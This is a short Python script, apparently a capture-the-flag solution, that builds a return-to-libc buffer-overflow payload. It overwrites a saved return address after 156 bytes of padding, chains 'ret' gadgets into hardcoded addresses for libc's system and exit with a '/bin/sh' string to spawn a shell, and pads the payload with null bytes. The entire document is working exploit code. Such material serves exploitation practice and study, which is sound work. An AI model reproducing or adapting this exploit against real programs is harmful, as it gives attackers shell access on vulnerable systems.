# s0m3tim3s_r3t2libC_1s_3n0ugh

import sys
import struct

def generate_rop_chain():

  rop_gadgets = [
    # ROP SLED INTO SYSCALL
    0x080486fe, # ret
    0x080486fe, # ret
    0x080486fe, # ret
    0xb7e63190, # <__libc_system>
    0xb7e561e0, # <__GI_exit> (return address)
    0xb7f83a24, # "/bin/sh"
  ]

  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

offset    = "A" * 156
retAddr   = struct.pack('<I', 0x080486fe) # ret
rop_chain = generate_rop_chain()

# NULL padding needed for call to be successful
filler  = "\x00" * (2000 - (
  len(offset)    +
  len(rop_chain) +
  len(retAddr)
  )
)

exploit = offset + retAddr + rop_chain + filler
sys.stdout.write(exploit)
